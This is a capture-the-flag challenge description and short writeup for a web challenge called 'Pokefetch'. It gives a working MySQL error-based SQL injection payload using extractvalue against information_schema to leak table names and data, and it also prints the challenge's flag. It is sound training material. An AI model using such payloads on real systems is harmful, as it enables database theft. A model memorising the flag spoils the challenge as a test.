# Pokefetch

### Difficulty
medium

### Challenge Description

Explore the legendary poke world, you might not know what is hidden there... `Set Query Let's inject`...

### Short Writeup

+ `1' and extractvalue(0x0a, concat(0x0a, (select table_name from information_schema.tables where table_schema=database()))) # ` should get the table name.
+ Then using the same error based injection they need to leak the pokemoms and URLs.
+ One of the pokemom's URL is the flag.

### Flag

inctfj{http://1_70v3_3v07u710n5.com}

### Author

**exigent07**
